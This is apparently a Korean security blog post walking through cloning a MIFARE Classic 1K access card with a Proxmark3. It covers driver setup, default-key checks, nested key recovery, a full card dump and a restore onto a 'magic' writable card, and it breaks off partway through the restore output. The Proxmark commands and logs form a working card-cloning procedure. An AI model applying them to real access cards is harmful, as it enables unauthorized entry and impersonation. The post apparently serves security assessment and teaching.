---
layout: post
title:  "RFID(Proxmark) hacking"
tags: RFID hardware protocol
---

# 보안경비 - RFID(Proxmark)
# 1. Proxmark 3 기본스펙

도구 설명 : 오픈소스 RFID 리더기 겸 크래킹 도구

사용 목적 : RFID 태그를 해킹하여 데이터를 변조, 스니핑, 복제 등의 공격을 수행하기 위해서

지원하는 모델 : 125Khz, 134KHz, 13.56 MHz 카드

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/4-1_proxmark_.jpg](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/4-1_proxmark_.jpg)


다양한 태그 종류를 지원하며, 태그 종류 별로 지원이 되는 기능이 다르다.

# 2. 점검 대상

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled.png)

# 3. 상세 내용

<aside>
💡 분석 순서
① Proxmark3 PC 연결
② RFID 분석
③ RFID 복제
④ replay attack

</aside>

3-1) Proxmark3↔PC 연결한다.

proxmark3는 아래 사진과 같이 위아래로 125Khz(저주파), 13.56Mhz(고주파) 카드를 읽을 수 있다. 

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%201.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%201.png)

- Proxmark3 드라이버 설치
    
    1) Proxmark3 드라이버(pm3-bin-2.4.0)를 다운로드 한다.
    
    - 다운로드 링크  : [http://proxmark.org/forum/viewtopic.php?id=1562](http://proxmark.org/forum/viewtopic.php?id=1562)  → 현재 링크가 사용되지 않음
    
    [pm3-bin-2.4.0.rar](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/pm3-bin-2.4.0.rar)
    
    - 다운로드 링크 :  [https://code.google.com/archive/p/proxmark3/downloads](https://code.google.com/archive/p/proxmark3/downloads)
    
    2) 위 파일을 통해 드라이버를 설치한다. 
    
    압축 해제 후 드라이버를 설치
    
    3) 장치 관리자에서 proxmark3가 연결되어 있는 포트를 확인(COM3)
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%202.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%202.png)
    
    4) 드라이버를 선택하고 우클릭으로 드라이버 업데이트를 선택한다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%203.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%203.png)
    
    5) 컴퓨터의 사용 가능한 드라이버 목록에서 직접 선택을 클릭한다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%204.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%204.png)
    
    6) 하단의 [디스크 있음(H)]을 클릭한다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%205.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%205.png)
    
    7) 설치할 드라이버 선택 후 [열기(O)]을 클릭한다.
    
    (드라이버 위치 `pm3-bin-2.4.0\Windows Drivers\CDC (new serial interface)/proxmark3.inf`)
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%206.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%206.png)
    
    8) [다음(N)]을 클릭해 설치를 진행한다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%207.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%207.png)
    
    설치되지 않을 경우 참조
    
    [https://extrememanual.net/30424](https://extrememanual.net/30424)
    
    9) 정상적으로 proxmark3 드라이버가 설치되었다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%208.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%208.png)
    
    10) 아래 경로에 접근 후 proxmark3.exe와 연결된 포트번호 연결 시 proxmark3 프롬프트를 확인할 수 있다.
    
    ```c
    C:\Users\kyu\Downloads\pm3-bin-2.4.0\pm3-bin-2.4.0\win32 (client+GUI)
    > proxmark3.exe COM3
    ```
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%209.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%209.png)
    
    11) hw tune 명령어를 통해 proxmark3의 안테나가 정상적으로 동작하는지 확인이 가능하다.  그래프도 함께 실행되어 확인된다.
    
    ![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2010.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2010.png)
    

3-2) Proxmark Tool.exe를 통해 GUI 환경으로 사용할 수 있다. 화면에서 보여지는 기능은 아래와 같다.

<aside>
💡 ① 연결할 포트 설정(COM3)
② Proxmark 도구에 명령어 실행(Enter를 통해 실행)
③ 태그 종류 별로 명령어 모음
④ 선택된 명령어의 옵션 설정 및 실행
⑤ Proxmark의 명령어 실행 결과 및 로그

</aside>

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2011.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2011.png)

- proxmark3 명령어 가이드
    
    proxmark3의 공식 깃허브에 각 명령어를 소개하는 글이 있다.
    
    [https://github.com/Proxmark/proxmark3/wiki/commands](https://github.com/Proxmark/proxmark3/wiki/commands)
    
    <aside>
    💡 proxmark3의 경우 hf(high frequency), lf(low frequency)에 따라 명령어가 나뉘며, RFID 태그의 종류에 따라 각각 다른 명령어를 통해 실행된다.
    
    </aside>
    

3-3) 공격 대상의 카드를 proxmark3에 올린 뒤, hf search로 해당 카드의 정보를 읽는다. 카드의 타입(MIFARE 1K), 카드의 UID(75271739)를 확인할 수 있다. 카드의 타입에 따라 명령어 셋이 달라지는데 MIFARE의 경우 mf 명령어 셋을 이용할 수 있다. 

<aside>
💡 [ hf / lf ] search → proxmark에서 지원하는 hf 태그를 검색해서 정보를 알려준다.
ex) hf search

</aside>

```c
proxmark3> hf search
 UID : 75 27 17 39           
ATQA : 00 04          
 SAK : 08 [2]          
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          
proprietary non iso14443-4 card found, RATS not supported          
Answers to chinese magic backdoor commands: NO          
Valid ISO14443A Tag Found - Quiting Search
```

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2012.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2012.png)

3-4) hf mf chk * ? 명령어를 통해 파일에 키를 덤프하는 명령어에 사용될 키 ffffffffffff를 확인할 수 있다.

💡 hf mf chk 명령어 → 카드의 각 블록의 키 값을 확인하고, 쓸 수 있는 명령어
Usage : hf mf chk <block number>|<*card memory> <key type (A/B/?)> [t|d] [<key (12 hex symbols)>] [<dic (*.dic)>]
ex) hf mf chk * ? → 모든 블록의 모든 key type(A/B)을 확인


```c
proxmark3> hf mf chk * ?
No key specified, trying default keys          
chk default key[ 0] ffffffffffff          
chk default key[ 1] 000000000000          
chk default key[ 2] a0a1a2a3a4a5          
chk default key[ 3] b0b1b2b3b4b5          
chk default key[ 4] aabbccddeeff          
chk default key[ 5] 4d3a99c351dd          
chk default key[ 6] 1a982c7e459a          
chk default key[ 7] d3f7d3f7d3f7          
chk default key[ 8] 714c5c886e97          
chk default key[ 9] 587ee5f9350f          
chk default key[10] a0478cc39091          
chk default key[11] 533cb6c723f6          
chk default key[12] 8fd0a4f256e9          
--sector: 0, block:  3, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 1, block:  7, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 2, block: 11, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 3, block: 15, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 4, block: 19, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 5, block: 23, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 6, block: 27, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 7, block: 31, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 8, block: 35, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 9, block: 39, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:10, block: 43, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:11, block: 47, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:12, block: 51, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:13, block: 55, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:14, block: 59, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector:15, block: 63, key type:A, key count:13           
Found valid key:[ffffffffffff]          
--sector: 0, block:  3, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 1, block:  7, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 2, block: 11, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 3, block: 15, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 4, block: 19, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 5, block: 23, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 6, block: 27, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 7, block: 31, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 8, block: 35, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector: 9, block: 39, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:10, block: 43, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:11, block: 47, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:12, block: 51, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:13, block: 55, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:14, block: 59, key type:B, key count:13           
Found valid key:[ffffffffffff]          
--sector:15, block: 63, key type:B, key count:13           
Found valid key:[ffffffffffff]
```

3-5) 추출된 키를 통해 dumkeys.bin파일로 덤프한다.

```c
proxmark3> hf mf nested 1 0 A ffffffffffff d
Testing known keys. Sector count=16          
nested...          
Time in nested: 4.479 (inf sec per key)
-----------------------------------------------
Iterations count: 0
|---|----------------|---|----------------|---|          
|sec|key A           |res|key B           |res|          
|---|----------------|---|----------------|---|          
|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|001|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          
|---|----------------|---|----------------|---|          
Printing keys to binary file dumpkeys.bin...
```

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2013.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2013.png)

3-6) dump 명령어를 통해 카드의 내용을 덤프한다. 덤프된 내용은 filedump.bin으로 저장된다.

```c
proxmark3> hf mf dump
|-----------------------------------------|          
|------ Reading sector access bits...-----|          
|-----------------------------------------|          
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
#db# READ BLOCK FINISHED                 
|-----------------------------------------|          
|----- Dumping all blocks to file... -----|          
|-----------------------------------------|          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  0.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  0.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  0.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  0.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  1.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  1.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  1.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  1.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  2.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  2.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  2.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  2.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  3.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  3.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  3.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  3.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  4.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  4.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  4.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  4.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  5.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  5.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  5.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  5.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  6.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  6.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  6.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  6.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  7.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  7.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  7.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  7.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  8.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  8.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  8.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  8.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector  9.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector  9.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector  9.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector  9.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 10.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 10.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 10.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 10.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 11.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 11.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 11.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 11.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 12.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 12.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 12.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 12.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 13.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 13.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 13.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 13.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 14.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 14.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 14.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 14.          
#db# READ BLOCK FINISHED                 
Successfully read block  0 of sector 15.          
#db# READ BLOCK FINISHED                 
Successfully read block  1 of sector 15.          
#db# READ BLOCK FINISHED                 
Successfully read block  2 of sector 15.          
#db# READ BLOCK FINISHED                 
Successfully read block  3 of sector 15.          
Dumped 64 blocks (1024 bytes) to file dumpdata.bin
```

3-7) 위에서 덤프된 데이터를 복사하기 위해 13.56Mhz의 카드를 올리고 hf search를 통해 내용을 확인한다. 여기서 중요한 점은 Answers to chinese magic backdoor commands의 값이 YES여야 한다. 해당 값이 없거나, NO로 되어 있으면 복제할 수 없는 카드다. 보통 rewritable이 가능한 카드로 검색해서 구매 후 진행할 필요가 있다.

```c
proxmark3> hf search
 UID : 93 bd f2 0c           
ATQA : 00 04          
 SAK : 08 [2]          
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          
proprietary non iso14443-4 card found, RATS not supported          
Answers to chinese magic backdoor commands: YES          
Valid ISO14443A Tag Found - Quiting Search
```

![/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2014.png](/assets/images/%EB%B3%B4%EC%95%88%EA%B2%BD%EB%B9%84%20-%20RFID(Proxmark)%205590f76922bc4ddb910f87908659c755/Untitled%2014.png)

3-8) 덤프된 데이터를 이용해 테스트 카드에 복제한다.

```c
proxmark3> hf mf restore 1
Restoring dumpdata.bin to card          
Writing to block   0: 75 27 17 39 7c 08 04 00 01 a8 3e 6d 57 cf 0d 1d           
#db# Cmd Error: 04                 
#db# Write block error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block   1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block   2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block   3: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block   4: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block   5: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block   6: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block   7: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block   8: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block   9: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  11: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  12: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  13: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  14: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  15: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  16: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  17: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  18: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  19: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  21: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  22: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  23: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  24: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  25: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  26: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  27: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  28: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  29: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  31: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  32: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  33: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  34: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  35: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  36: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  37: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  38: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  39: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block  41: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block  42: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block  43: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# Authentication failed. Card timeout.                 
#db# Auth error                 
#db# WRITE BLOCK FINISHED                 
isOk:00          
Writing to block  44: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  45: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  46: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  47: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  48: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  49: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  51: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  52: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  53: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  54: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  55: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  56: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  57: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  58: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  59: ff ff ff ff ff ff ff 07 80 69 ff ff ff ff ff ff           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
#db# WRITE BLOCK FINISHED                 
isOk:01          
Writing to block  61: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
